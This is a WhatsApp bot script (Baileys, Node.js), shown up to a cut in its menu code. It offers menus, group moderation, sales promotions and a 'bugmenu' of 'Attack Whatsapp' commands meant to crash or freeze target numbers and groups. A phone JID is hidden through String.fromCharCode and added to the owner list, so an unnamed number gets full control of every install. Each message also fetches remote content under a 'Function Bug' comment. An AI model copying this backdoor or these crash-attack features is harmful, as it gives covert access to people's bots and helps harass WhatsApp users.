/* 

=========================================================================

  🕊 Credits By Vynx
    wa.me/628982103547
    Saluran Info Script : https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V
   
=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings.js');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAvynxection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = vynx = async (vynx, m, chatUpdate, store) => {
	try {
await LoadDataBase(vynx, m)
const botNumber = await vynx.decodeJid(vynx.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = `.`
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const foto = fs.readFileSync('./image/Shadow.jpg')
const yuda = fs.readFileSync('./image/vynx.jpg')
const pler = fs.readFileSync('./image/musik1.mp3')

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: foto,
      itemCount: "8193",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `▢ Vynx... SHP`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363416705412570@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Nika"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

//FUNCT UCAPAN
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
const greeting = getGreeting();

//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return vynx.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await vynx.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await vynx.sendMessage(m.chat, {text: `*Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await vynx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await vynx.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await vynx.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await vynx.sendMessage(m.chat, {text: `*Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await vynx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await vynx.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await vynx.sendMessage(m.chat, {text: `
Open Panel Ptrodactyl By Vynx

5gb - \`5.000\`

6gb - \`6.000\`

7gb - \`7.000\`

8gb - \`8.000\`

9gb - \`9.000\`

unli - \`10.000\`

Panel Berkualitas Pasti nya, Admin nya Cuman Gw sndirian, jadi gada drma delete/intip, expired 1bulan full, Spek r16 c4 gada drma lelet! 

minat? pm aja
https://wa.me/62895320985817

Saluran / testi : https://whatsapp.com/channel/0029Vb9ghly6GcGM2ngCEk00
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}


//~~~~~~~~~ Function Bug ~~~~~~~~~~//
let apiClient;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
//AKHIR BUG
const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

vynx.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await vynx.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await vynx.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await vynx.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return vynx.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

async function payreply(teks) {
const ppuser = "https://files.catbox.moe/mmi6wr.jpg"; 
return vynx.sendMessage(
m.chat, { text: `${teks}`, contextInfo: { 
mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, 
title: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊", 
body: "VynxDeveloper", 
previewType: "PHOTO" }}}, 
{ quoted: lol })}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: vynx.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*DepayOffc* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Depay Menyediakan*
- *Panel Pterodactyl Server Private*
- *Panel Pterodactyl Server Pubclic*
- *Script Bot WhatsApp*
- *SubDomain (Request Nama Domain)*
- *Nokos WhatsApp All Region (Tergantung Stok!)*
- *Jasa Install Panel Pterodactyl*
-  *Dan Lain Lain Langsung Tanyakan Saja.*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Bantu Join Grup*
- *Grup :*
https://chat.whatsapp.com/HUpvqjEvkhI5ujzdilZQFC`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await vynx.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "shd": {
let teksnya = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ *ÐÈVÈLÖþÈR ßÖ†*" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: teksnya,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604844054_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟭",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Death🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });  
    await vynx.sendMessage(m.chat, {audio: fs.readFileSync('./image/musik1.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})   
}
break;

case "bugmenu": {
let depi = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗕𝘂𝗴 ]\`
◇ .shadow 628xxx [ Button Bug ]
◇ .xvshadow 628xxx [ Forclose Bug ]
◇ .shadow-force 628xxx [ Forclose Hard ]
◇ .invis-vx 628xxx [ Delay Invis ]
◇ .invis-shadow 628xxx [ Delay Hard ]

\`[ 𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽 ]\`
◇ .force-group [ Link Group ]
◇ .shadow-group [ Link Group ]
◇ .death-group [ In Place ]
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: depi,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604845474_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` },
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });   
    await vynx.sendMessage(m.chat, {audio: fs.readFileSync('./image/musik1.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})    
}
break;

case "funmenu": {
let kuntul = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂 ]\`
◇ .cekidch
◇ .cekidgc
◇ .qc
◇ .brat
◇ .bratvid
◇ .readviewonce
◇ .stickerwm
◇ .sticker
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: kuntul,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604845970_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case "smenu": {
let bjir = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝗲𝗻𝘂 ]\`
◇ .yts
◇ .apkmod
◇ .pinterest
◇ .gimage  
◇ .sfile
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: bjir,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604846252_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case "toolsmenu": {
let monyet = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By Vynx 
\`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
